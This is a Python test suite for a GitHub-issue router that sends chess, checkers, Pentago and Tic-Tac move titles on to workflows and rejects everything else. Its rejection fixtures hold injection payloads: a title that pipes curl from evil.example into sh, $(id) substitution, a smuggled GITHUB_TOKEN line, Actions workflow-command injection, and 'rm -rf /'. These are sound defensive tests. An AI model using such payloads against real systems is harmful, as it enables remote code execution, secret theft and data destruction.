#!/usr/bin/env python3
"""Tests for the move router.

WHY THIS EXISTS. `route.py` is the one thing between a title anyone can type
and a token that starts a workflow in another repository. Every way a title
can be wrong has to end in a reply and a closed issue, and every way the
table can be wrong has to stop the run, so both are pinned here: the moves
that go through, the titles that never do, and the rows the table refuses.

Nothing here reads or writes outside a throwaway folder. Run it from the root
of the repository:

    python3 -m unittest discover -s intake -p 'test_*.py'
"""

from __future__ import annotations

import contextlib
import io
import json
import os
import pathlib
import shutil
import tempfile
import unittest
from unittest import mock

import route

ROW = {
    'repository': 'tannergolden/tannergolden',
    'workflow': 'chess.yml',
    'ref': 'Development',
    'pattern': ('(?P<uci>[a-h][1-8][a-h][1-8][qrbn]?) · game (?P<game>[1-9][0-9]{0,3})'
                ' · move (?P<move_number>[1-9][0-9]{0,2})'),
}
PLAYER = {'player': 'octocat', 'player_id': '583231', 'issue': '7', 'owner': 'tannergolden'}


class Folder:
    """A throwaway folder for tables and run files."""

    def __init__(self) -> None:
        self.root = pathlib.Path(tempfile.mkdtemp(prefix='route-test-'))

    def table(self, table: object) -> pathlib.Path:
        path = self.root / 'routes.json'
        path.write_text(json.dumps(table), encoding='utf-8')
        return path

    def cleanup(self) -> None:
        shutil.rmtree(self.root, ignore_errors=True)


class RouteTestCase(unittest.TestCase):
    def setUp(self) -> None:
        self.folder = Folder()
        self.addCleanup(self.folder.cleanup)
        self.routes = route.load(self.folder.table({'chess': ROW}))

    def decide(self, title: str, **who: str) -> dict:
        return route.route(title, **{**PLAYER, **who}, routes=self.routes)


class DispatchTests(RouteTestCase):
    def test_a_move_goes_to_its_game(self) -> None:
        decision = self.decide('chess: e2e4 · game 1 · move 1')
        self.assertEqual(decision['action'], 'dispatch')
        self.assertEqual(
            (decision['owner'], decision['repo'], decision['workflow']),
            ('tannergolden', 'tannergolden', 'chess.yml'),
        )
        self.assertEqual(decision['body'], {
            'ref': 'Development',
            'inputs': {
                'uci': 'e2e4', 'game': '1', 'move_number': '1',
                'issue': '7', 'player': 'octocat', 'player_id': '583231',
            },
        })

    def test_a_promotion_carries_its_piece(self) -> None:
        decision = self.decide('chess: e7e8q · game 12 · move 41')
        self.assertEqual(decision['body']['inputs']['uci'], 'e7e8q')
        self.assertEqual(decision['body']['inputs']['game'], '12')
        self.assertEqual(decision['body']['inputs']['move_number'], '41')

    def test_space_around_the_title_is_ignored(self) -> None:
        self.assertEqual(self.decide('  chess: g1f3 · game 3 · move 2 ')['action'], 'dispatch')

    def test_the_owner_plays_through_the_same_door(self) -> None:
        decision = self.decide('chess: e7e5 · game 1 · move 1', player='tannergolden')
        self.assertEqual(decision['action'], 'dispatch')
        self.assertEqual(decision['body']['inputs']['player'], 'tannergolden')

    def test_an_optional_group_that_did_not_match_is_empty(self) -> None:
        routes = route.load(self.folder.table({'chess': {**ROW, 'pattern': '(?P<a>[a-h])(?P<b>[1-8])?'}}))
        decision = route.route('chess: e', **PLAYER, routes=routes)
        self.assertEqual(decision['body']['inputs']['b'], '')


class RejectTests(RouteTestCase):
    TITLES = (
        '',
        'hello',
        'chess',
        'chess:',
        'chess: ',
        'chess:e2e4 · game 1 · move 1',
        'Chess: e2e4 · game 1 · move 1',
        'chess: e2e4',
        'chess: e2e9 · game 1 · move 1',
        'chess: e2e4k · game 1 · move 1',
        'chess: e2e4 · game 0 · move 1',
        'chess: e2e4 · game 1 · move 0',
        'chess: e2e4 · game 01 · move 1',
        'chess: e2e4 · game 1 · move 1000',
        'chess: e2e4 · game 1 · move 1 · and more',
        'chess: e2e4 . game 1 . move 1',
        'checkers: e2e4 · game 1 · move 1',
        'chess-960: e2e4 · game 1 · move 1',
    )
    # Each of these is a move with something riding on it.
    ATTACKS = (
        'chess: e2e4 · game 1 · move 1`; curl evil.example | sh`',
        'chess: e2e4$(id) · game 1 · move 1',
        'chess: e2e4 · game 1 · move 1\nGITHUB_TOKEN=stolen',
        'chess: e2e4 · game 1 · move 1\n::add-mask::x',
        'chess: e2e4 · game ${{ secrets.PLAY_APP_PRIVATE_KEY }} · move 1',
        'chess: e2e4 · game 1 · move 1\r\naction=dispatch',
        'chess: e2e4 · game ١ · move 1',
        '::stop-commands::x',
        '__proto__: e2e4 · game 1 · move 1',
    )

    def test_anything_but_a_move_is_turned_away(self) -> None:
        for title in self.TITLES + self.ATTACKS:
            with self.subTest(title=title):
                self.assertEqual(self.decide(title), {'action': 'reject'})

    def test_the_owner_keeps_their_own_issues(self) -> None:
        for title in ('The board did not redraw', 'chess: the board did not redraw', ''):
            with self.subTest(title=title):
                self.assertEqual(self.decide(title, player='TannerGolden'), {'action': 'ignore'})

    def test_a_loose_pattern_still_passes_only_tokens(self) -> None:
        routes = route.load(self.folder.table({'chess': {**ROW, 'pattern': '(?P<move>.+)'}}))
        for title, action in (
            ('chess: e2e4', 'dispatch'),
            ('chess: O-O+', 'dispatch'),
            ('chess: e2e4 and a sentence', 'reject'),
            ('chess: `id`', 'reject'),
            ('chess: @everyone', 'reject'),
            ('chess: ' + 'a' * 65, 'reject'),
        ):
            with self.subTest(title=title):
                self.assertEqual(route.route(title, **PLAYER, routes=routes)['action'], action)


class ShippedTableTests(unittest.TestCase):
    """The four games' rows in `routes.json`, read through the router as a move link reaches it."""

    def setUp(self) -> None:
        self.routes = route.load()

    def decide(self, title: str, player: str = 'octocat', player_id: str = '583231') -> dict:
        return route.route(title, player=player, player_id=player_id, issue='7', owner='tannergolden',
                           routes=self.routes)

    def test_the_four_games_in_tier_order(self) -> None:
        self.assertEqual(list(self.routes), ['tictac', 'pentago', 'checkers', 'chess'])
        for name, game in self.routes.items():
            with self.subTest(name=name):
                self.assertEqual((game['owner'], game['repo'], game['ref'], game['workflow']),
                                 ('tannergolden', 'tannergolden', 'Development', f'{name}.yml'))

    def test_each_game_s_move_goes_to_its_workflow_with_its_inputs(self) -> None:
        for title, game, inputs in (
            # A Tic-Tac square, a ghost's on moves 1 and 2 and a mark's after them, and a Pentago ghost's hole, then
            # a move's hole, quarter and way.
            ('tictac: e5 · game 1 · move 1', 'tictac', {'move': 'e5', 'game': '1', 'move_number': '1'}),
            ('tictac: b8 · game 1 · move 2', 'tictac', {'move': 'b8', 'game': '1', 'move_number': '2'}),
            ('tictac: e5 · game 1 · move 3', 'tictac', {'move': 'e5', 'game': '1', 'move_number': '3'}),
            ('tictac: a1 · game 9 · move 4', 'tictac', {'move': 'a1', 'game': '9', 'move_number': '4'}),
            ('tictac: i9 · game 12 · move 81', 'tictac', {'move': 'i9', 'game': '12', 'move_number': '81'}),
            ('pentago: b5 · game 1 · move 1', 'pentago', {'move': 'b5', 'game': '1', 'move_number': '1'}),
            ('pentago: e4-ur-cw · game 1 · move 9', 'pentago', {'move': 'e4-ur-cw', 'game': '1', 'move_number': '9'}),
            ('pentago: a1-ll-acw · game 4 · move 3', 'pentago',
             {'move': 'a1-ll-acw', 'game': '4', 'move_number': '3'}),
            ('pentago: f6-lr-cw · game 30 · move 36', 'pentago',
             {'move': 'f6-lr-cw', 'game': '30', 'move_number': '36'}),
            ('pentago: c3-ul-acw · game 2 · move 10', 'pentago',
             {'move': 'c3-ul-acw', 'game': '2', 'move_number': '10'}),
            ('checkers: 11-15 · game 6 · move 10', 'checkers', {'move': '11-15', 'game': '6', 'move_number': '10'}),
            ('checkers: 22x15 · game 6 · move 11', 'checkers', {'move': '22x15', 'game': '6', 'move_number': '11'}),
            ('checkers: 22x15x8 · game 6 · move 11', 'checkers',
             {'move': '22x15x8', 'game': '6', 'move_number': '11'}),
            ('checkers: 1-5 · game 2 · move 1', 'checkers', {'move': '1-5', 'game': '2', 'move_number': '1'}),
            ('checkers: 32x23x14x5 · game 2 · move 80', 'checkers',
             {'move': '32x23x14x5', 'game': '2', 'move_number': '80'}),
            ('chess: e2e4 · game 1 · move 12', 'chess', {'uci': 'e2e4', 'game': '1', 'move_number': '12'}),
        ):
            with self.subTest(title=title):
                decision = self.decide(title)
                self.assertEqual(decision['action'], 'dispatch')
                self.assertEqual((decision['game'], decision['owner'], decision['repo'], decision['workflow']),
                                 (game, 'tannergolden', 'tannergolden', f'{game}.yml'))
                self.assertEqual(decision['body'], {
                    'ref': 'Development',
                    'inputs': {**inputs, 'issue': '7', 'player': 'octocat', 'player_id': '583231'},
                })

    def test_the_owner_plays_every_game_through_the_same_door(self) -> None:
        for title in ('tictac: e5 · game 9 · move 1', 'tictac: c3 · game 9 · move 5', 'pentago: b5 · game 4 · move 2',
                      'pentago: e4-ur-cw · game 4 · move 9', 'checkers: 11-15 · game 6 · move 1'):
            with self.subTest(title=title):
                decision = self.decide(title, player='tannergolden', player_id='24684994')
                self.assertEqual(decision['action'], 'dispatch')
                self.assertEqual(decision['body']['inputs']['player'], 'tannergolden')

    def test_every_game_and_move_number_a_link_can_carry(self) -> None:
        for name, code in (('tictac', 'e5'), ('pentago', 'b5'), ('pentago', 'e4-ur-cw'), ('checkers', '11-15')):
            for game, number in ((1, 1), (999999999, 999999999)):
                with self.subTest(name=name, game=game, number=number):
                    decision = self.decide(f'{name}: {code} · game {game} · move {number}')
                    self.assertEqual(decision['body']['inputs']['game'], str(game))
                    self.assertEqual(decision['body']['inputs']['move_number'], str(number))

    def test_every_square_hole_and_turn_goes_through(self) -> None:
        # Tic-Tac's 81 squares, a1 to i9, and Pentago's 36 holes, a1 to f6, each alone, as a ghost goes, and each
        # with every one of its eight turns, as a move goes.
        for file in 'abcdefghi':
            for rank in '123456789':
                with self.subTest(square=file + rank):
                    decision = self.decide(f'tictac: {file}{rank} · game 1 · move 1')
                    self.assertEqual(decision['body']['inputs']['move'], file + rank)
        turns = [f'-{quarter}-{way}' for quarter in ('ul', 'ur', 'll', 'lr') for way in ('cw', 'acw')]
        for file in 'abcdef':
            for rank in '123456':
                for turn in ('', *turns):
                    code = f'{file}{rank}{turn}'
                    with self.subTest(code=code):
                        decision = self.decide(f'pentago: {code} · game 1 · move 3')
                        self.assertEqual(decision['body']['inputs']['move'], code)

    def test_near_misses_are_turned_away(self) -> None:
        for title in (
            'tictac: j5 · game 9 · move 3',
            'tictac: e0 · game 9 · move 3',
            'tictac: e10 · game 9 · move 3',
            'tictac: E5 · game 9 · move 3',
            'tictac: e · game 9 · move 3',
            'tictac: 5 · game 9 · move 3',
            'tictac: e5e6 · game 9 · move 3',
            'tictac: Xe5 · game 9 · move 3',
            'tictac: e5# · game 9 · move 3',
            'tictac: e5-ur-cw · game 9 · move 3',
            'tictac: e5 game 9 move 3',
            'tictac: e5 · game 9 move 3',
            'tictac: e5 . game 9 . move 3',
            'tictac: e5 · game 9 · move 3 please',
            'tictac: e5 · game 9 · move 3 · e6',
            'tictac: e5 · game 0 · move 3',
            'tictac: e5 · game 9 · move 03',
            'tictac: e5 · game 1000000000 · move 3',
            'tictac: e5',
            'tic-tac: e5 · game 9 · move 3',
            'TicTac: e5 · game 9 · move 3',
            'tictactoe: b2 · game 9 · move 3',
            'pentago: g1 · game 4 · move 9',
            'pentago: a7 · game 4 · move 9',
            'pentago: a0 · game 4 · move 9',
            'pentago: B5 · game 4 · move 9',
            'pentago: e4-ur · game 4 · move 9',
            'pentago: e4-cw · game 4 · move 9',
            'pentago: e4-ur- · game 4 · move 9',
            'pentago: e4-ur-ccw · game 4 · move 9',
            'pentago: e4-um-cw · game 4 · move 9',
            'pentago: e4-UR-cw · game 4 · move 9',
            'pentago: e4-ur-CW · game 4 · move 9',
            'pentago: e4-ur-cw-ll-cw · game 4 · move 9',
            'pentago: e4urcw · game 4 · move 9',
            'pentago: e4 ur cw · game 4 · move 9',
            'pentago: e4_ur_cw · game 4 · move 9',
            'pentago: e4--ur-cw · game 4 · move 9',
            'pentago: -ur-cw · game 4 · move 9',
            'pentago: e4# · game 4 · move 9',
            'pentago: e4-ur-cw# · game 4 · move 9',
            'pentago: ⚪e4-ur-cw · game 4 · move 9',
            'pentago: e4-ur-cw game 4 · move 9',
            'pentago: e4-ur-cw · game 4 · move 9 now',
            'pentago: b5 · game 4',
            'Pentago: b5 · game 4 · move 1',
            'connectfour: 4 · game 4 · move 9',
            'checkers: 33-15 · game 6 · move 10',
            'checkers: 11-33 · game 6 · move 10',
            'checkers: 0-4 · game 6 · move 10',
            'checkers: 05-09 · game 6 · move 10',
            'checkers: 11- · game 6 · move 10',
            'checkers: -15 · game 6 · move 10',
            'checkers: 11 · game 6 · move 10',
            'checkers: 1115 · game 6 · move 10',
            'checkers: 11-15-19 · game 6 · move 10',
            'checkers: 11-15x18 · game 6 · move 10',
            'checkers: 22x · game 6 · move 10',
            'checkers: 22X15 · game 6 · move 10',
            'checkers: 11 - 15 · game 6 · move 10',
            'checkers: 11-15 game 6 · move 10',
            'checkers: 11-15 · game 6 · move 10 · move 11',
            'checkers: 11-15 · game 6 · move 10 and 11',
            'checkers: e2e4 · game 6 · move 10',
            'checkers: e5 · game 9 · move 3',
            'checkers: e4-ur-cw · game 4 · move 9',
            'chess: e5 · game 9 · move 3',
            'chess: e4-ur-cw · game 4 · move 9',
            'chess: 11-15 · game 6 · move 10',
            'tictac: e2e4 · game 1 · move 12',
            'tictac: 11-15 · game 6 · move 10',
            'pentago: i9 · game 9 · move 3',
            'pentago: e2e4 · game 1 · move 12',
            'pentago: 11-15 · game 6 · move 10',
        ):
            with self.subTest(title=title):
                self.assertEqual(self.decide(title), {'action': 'reject'})


class LabelTests(unittest.TestCase):
    """The labels each decision gives, every name the intake's own, never the title's."""

    def test_every_shipped_game_has_its_own_label(self) -> None:
        for game, (sign, title, _) in route.GAMES.items():
            with self.subTest(game=game):
                found = route.labels({'action': 'dispatch', 'game': game})
                self.assertEqual([label['name'] for label in found], ['move', f'game: {game}'])
                self.assertEqual(found[1]['description'], f'{sign} A move for {title}.')
        self.assertEqual(sorted(route.GAMES), sorted(route.load()))

    def test_a_game_added_to_the_table_alone_still_gets_a_label(self) -> None:
        found = route.labels({'action': 'dispatch', 'game': 'go'})
        self.assertEqual(found[1], {'name': 'game: go', 'color': 'ededed', 'description': '🎲 A move for go.'})

    def test_every_label_fits_what_github_takes(self) -> None:
        decisions = [{'action': 'dispatch', 'game': game} for game in route.GAMES] + [{'action': 'reject'}]
        for decision in decisions:
            for label in route.labels(decision):
                self.assertLessEqual(len(label['name']), 50)
                self.assertLessEqual(len(label['description']), 100)
                self.assertRegex(label['color'], r'^[0-9a-f]{6}$')

    def test_an_owners_own_issue_gets_none(self) -> None:
        self.assertEqual(route.labels({'action': 'ignore'}), [])


class TableTests(unittest.TestCase):
    def setUp(self) -> None:
        self.folder = Folder()
        self.addCleanup(self.folder.cleanup)

    def refused(self, table: object, says: str) -> None:
        with self.assertRaises(route.TableError) as caught:
            route.load(self.folder.table(table))
        self.assertIn(says, str(caught.exception))

    def test_the_shipped_table_loads(self) -> None:
        routes = route.load()
        self.assertIn('chess', routes)
        self.assertEqual(routes['chess']['workflow'], 'chess.yml')

    def test_the_shipped_chess_pattern_reaches_every_game_and_move(self) -> None:
        # A game can run past 17,000 moves before the seventy-five-move rule and fivefold repetition must end it,
        # and the game takes up to nine digits for each: a move link for any of them is dispatched.
        routes = route.load()
        for game, move in ((1, 1), (1, 999), (1, 1000), (1, 17697), (10000, 1), (999999999, 999999999)):
            with self.subTest(game=game, move=move):
                decision = route.route(f'chess: e7e8q · game {game} · move {move}', player='octocat',
                                       player_id='583231', issue='7', owner='tannergolden', routes=routes)
                self.assertEqual(decision['action'], 'dispatch')
                self.assertEqual(decision['body']['inputs']['game'], str(game))
                self.assertEqual(decision['body']['inputs']['move_number'], str(move))
        too_long = route.route('chess: e2e4 · game 1 · move 1000000000', player='octocat', player_id='583231',
                               issue='7', owner='tannergolden', routes=routes)
        self.assertEqual(too_long['action'], 'reject')

    def test_the_description_is_not_a_game(self) -> None:
        routes = route.load(self.folder.table({'//': 'what this is', 'chess': ROW}))
        self.assertEqual(list(routes), ['chess'])

    def test_a_table_with_no_game_is_refused(self) -> None:
        self.refused({'//': 'nothing yet'}, 'names no game')
        self.refused([], 'one object')

    def test_a_table_that_is_not_json_is_refused(self) -> None:
        path = self.folder.root / 'routes.json'
        path.write_text('{"chess": ', encoding='utf-8')
        with self.assertRaises(route.TableError):
            route.load(path)

    def test_bad_rows_are_refused(self) -> None:
        for change, says in (
            ({'repository': 'tannergolden'}, 'owner/repository'),
            ({'repository': 'tannergolden/..'}, 'owner/repository'),
            ({'repository': 'tanner golden/x'}, 'owner/repository'),
            ({'workflow': 'chess.sh'}, 'workflow file name'),
            ({'workflow': '../chess.yml'}, 'workflow file name'),
            ({'ref': 'main..x'}, 'branch or a tag'),
            ({'ref': ''}, 'branch or a tag'),
            ({'pattern': '(?P<uci>[a-h'}, 'does not compile'),
            ({'pattern': '[a-h][1-8]'}, 'names no group'),
            ({'pattern': '(?P<Uci>[a-h])'}, 'cannot be a workflow input'),
            ({'pattern': '(?P<player>[a-z]+)'}, 'fills itself'),
            ({'pattern': '(?P<issue>[0-9]+)'}, 'fills itself'),
            ({'ref': 1}, 'every value is a string'),
        ):
            with self.subTest(change=change):
                self.refused({'chess': {**ROW, **change}}, says)

    def test_a_row_needs_exactly_its_keys(self) -> None:
        self.refused({'chess': {**ROW, 'extra': 'x'}}, 'exactly')
        row = dict(ROW)
        del row['ref']
        self.refused({'chess': row}, 'exactly')
        self.refused({'chess': 'tannergolden/tannergolden'}, 'exactly')

    def test_a_game_name_is_checked(self) -> None:
        self.refused({'Chess': ROW}, 'lower case')
        self.refused({'chess game': ROW}, 'lower case')


class MainTestCase(unittest.TestCase):
    """The script as the workflow runs it: environment in, three files out."""

    def setUp(self) -> None:
        self.folder = Folder()
        self.addCleanup(self.folder.cleanup)
        self.output = self.folder.root / 'output'
        self.output.write_text('', encoding='utf-8')

    def run_main(self, title: str, **env: str) -> tuple[int, str]:
        environment = {
            'GITHUB_REPOSITORY_OWNER': 'tannergolden',
            'GITHUB_OUTPUT': str(self.output),
            'RUNNER_TEMP': str(self.folder.root),
            'TITLE': title,
            'ISSUE': '7',
            'PLAYER': 'octocat',
            'PLAYER_ID': '583231',
            **env,
        }
        printed = io.StringIO()
        with mock.patch.dict(os.environ, environment, clear=True), contextlib.redirect_stdout(printed):
            code = route.main()
        return code, printed.getvalue()

    def outputs(self) -> dict[str, str]:
        lines = self.output.read_text(encoding='utf-8').splitlines()
        return dict(line.split('=', 1) for line in lines)

    def written(self, name: str) -> pathlib.Path:
        return self.folder.root / name


class MainTests(MainTestCase):
    """An issue just opened, as its event gives it."""

    def test_a_move_writes_its_dispatch_and_no_reply(self) -> None:
        code, printed = self.run_main('chess: e2e4 · game 1 · move 1')
        self.assertEqual(code, 0)
        self.assertEqual(self.outputs(), {
            'action': 'dispatch', 'issue': '7', 'player': 'octocat', 'player_id': '583231', 'game': 'chess',
            'owner': 'tannergolden', 'repo': 'tannergolden', 'workflow': 'chess.yml',
        })
        body = json.loads(self.written('dispatch.json').read_text(encoding='utf-8'))
        self.assertEqual(body['ref'], 'Development')
        self.assertEqual(body['inputs']['uci'], 'e2e4')
        # Its 🚀 says it was sent on, and the game's ruling is the one reply it gets.
        self.assertFalse(self.written('reply.md').exists())
        self.assertEqual(printed, 'Issue #7 by @octocat: dispatch to tannergolden/tannergolden, chess.yml.\n')
        labels = json.loads(self.written('labels.json').read_text(encoding='utf-8'))
        self.assertEqual(labels, [
            {'name': 'move', 'color': '1d76db', 'description': '🎲 A move for one of the games on the profile.'},
            {'name': 'game: chess', 'color': '5319e7', 'description': '♟️ A move for Chess.'},
        ])

    def test_a_rejected_title_is_never_echoed(self) -> None:
        title = 'chess: `rm -rf /` · game 1 · move 1'
        code, printed = self.run_main(title)
        self.assertEqual(code, 0)
        self.assertEqual(self.outputs(), {'action': 'reject', 'issue': '7', 'player': 'octocat', 'player_id': '583231'})
        self.assertFalse(self.written('dispatch.json').exists())
        reply = self.written('reply.md').read_text(encoding='utf-8')
        self.assertTrue(reply.startswith("👋 **This isn't a move, so it's closed.**\nThis repository only takes moves"))
        self.assertIn('without changing the title', reply)
        self.assertNotIn('rm -rf', reply + printed)
        labels = json.loads(self.written('labels.json').read_text(encoding='utf-8'))
        self.assertEqual([label['name'] for label in labels], ['invalid'])
        self.assertNotIn('rm -rf', json.dumps(labels))

    def test_the_owners_own_issue_writes_nothing_to_post(self) -> None:
        code, _ = self.run_main('A note to myself', PLAYER='tannergolden', PLAYER_ID='24684994')
        self.assertEqual(code, 0)
        self.assertEqual(self.outputs(), {'action': 'ignore', 'issue': '7', 'player': 'tannergolden',
                                          'player_id': '24684994'})
        self.assertFalse(self.written('reply.md').exists())
        self.assertFalse(self.written('labels.json').exists())

    def test_a_malformed_issue_stops_the_run(self) -> None:
        for env in ({'ISSUE': ''}, {'ISSUE': '7; echo'}, {'PLAYER': 'bot[bot]'}, {'PLAYER_ID': '0'},
                    {'GITHUB_REPOSITORY_OWNER': ''}):
            with self.subTest(env=env):
                code, printed = self.run_main('chess: e2e4 · game 1 · move 1', **env)
                self.assertEqual(code, 1)
                self.assertIn('::error::', printed)
                self.assertEqual(self.output.read_text(encoding='utf-8'), '')

    def test_a_broken_table_stops_the_run(self) -> None:
        broken = self.folder.table({'chess': {**ROW, 'workflow': 'chess'}})
        with mock.patch.object(route, 'ROUTES', broken):
            code, printed = self.run_main('chess: e2e4 · game 1 · move 1')
        self.assertEqual(code, 1)
        self.assertIn('::error file=intake/routes.json::', printed)
        self.assertEqual(self.output.read_text(encoding='utf-8'), '')



class SentAgainTests(MainTestCase):
    """A move sent again by its issue's number: read from the issue as it is now, never from the event."""

    def run_again(self, issue: object, asked: str = '7') -> tuple[int, str]:
        self.written('issue.json').write_text(json.dumps(issue), encoding='utf-8')
        # Nothing of the event reaches a move sent again: its title and author are the issue's own.
        return self.run_main('chess: a2a3 · game 9 · move 9', SENT_AGAIN='true', ISSUE=asked, PLAYER='',
                             PLAYER_ID='')

    def issue(self, **change: object) -> dict:
        return {'number': 7, 'title': 'chess: e2e4 · game 1 · move 1', 'state': 'open', 'locked': True,
                'user': {'login': 'octocat', 'id': 583231, 'type': 'User'},
                'labels': [{'name': 'move'}, {'name': 'stranded'}], **change}

    def test_a_stranded_move_goes_to_its_game_as_its_issue_has_it(self) -> None:
        code, printed = self.run_again(self.issue())
        self.assertEqual(code, 0)
        self.assertEqual(self.outputs(), {
            'action': 'dispatch', 'issue': '7', 'player': 'octocat', 'player_id': '583231', 'again': 'true',
            'stranded': 'true', 'locked': 'true', 'game': 'chess', 'owner': 'tannergolden', 'repo': 'tannergolden',
            'workflow': 'chess.yml',
        })
        body = json.loads(self.written('dispatch.json').read_text(encoding='utf-8'))
        self.assertEqual(body['inputs'], {'uci': 'e2e4', 'game': '1', 'move_number': '1', 'issue': '7',
                                          'player': 'octocat', 'player_id': '583231'})
        self.assertEqual(printed, 'Issue #7 by @octocat, sent again: dispatch to tannergolden/tannergolden,'
                                  ' chess.yml.\n')

    def test_an_issue_never_answered_is_answered_as_if_just_opened(self) -> None:
        code, _ = self.run_again(self.issue(title='hello', locked=False, labels=[]))
        self.assertEqual(code, 0)
        self.assertEqual(self.outputs(), {'action': 'reject', 'issue': '7', 'player': 'octocat',
                                          'player_id': '583231', 'again': 'true', 'stranded': 'false',
                                          'locked': 'false'})
        self.assertTrue(self.written('reply.md').read_text(encoding='utf-8').startswith("👋 **This isn't a move"))

    def test_an_issue_that_cannot_go_again_is_left_alone(self) -> None:
        for why, issue, said in (
            ('closed', self.issue(state='closed'), 'is closed'),
            ('a pull request', self.issue(pull_request={'url': 'x'}), 'is a pull request'),
            ("a bot's", self.issue(user={'login': 'official-arbiter[bot]', 'id': 1, 'type': 'Bot'}),
             'was opened by an app or a bot'),
            ('another issue', self.issue(number=8), "isn't the issue asked for"),
            ('not an issue', ['x'], "isn't the issue asked for"),
        ):
            with self.subTest(why=why):
                self.output.write_text('', encoding='utf-8')
                code, printed = self.run_again(issue)
                self.assertEqual(code, 0)
                self.assertEqual(self.outputs(), {'action': 'ignore'})
                self.assertEqual(printed, f'Issue #7 {said}, so it was left alone.\n')
                self.assertFalse(self.written('dispatch.json').exists())

    def test_an_issue_that_cannot_be_read_is_left_alone(self) -> None:
        self.written('issue.json').write_text('{', encoding='utf-8')
        code, printed = self.run_main('', SENT_AGAIN='true', PLAYER='', PLAYER_ID='')
        self.assertEqual((code, self.outputs()), (0, {'action': 'ignore'}))
        self.assertEqual(printed, "Issue #7 couldn't be read, so it was left alone.\n")

    def test_a_malformed_author_or_number_stops_the_run(self) -> None:
        for issue, asked in ((self.issue(user={'login': 'octocat', 'id': '583231', 'type': 'User'}), '7'),
                             (self.issue(user={'login': 'a b', 'id': 1, 'type': 'User'}), '7'),
                             (self.issue(), '7; echo')):
            with self.subTest(issue=issue['user'], asked=asked):
                self.output.write_text('', encoding='utf-8')
                code, printed = self.run_again(issue, asked)
                self.assertEqual(code, 1)
                self.assertIn('::error::', printed)
                self.assertEqual(self.output.read_text(encoding='utf-8'), '')


if __name__ == '__main__':
    unittest.main()
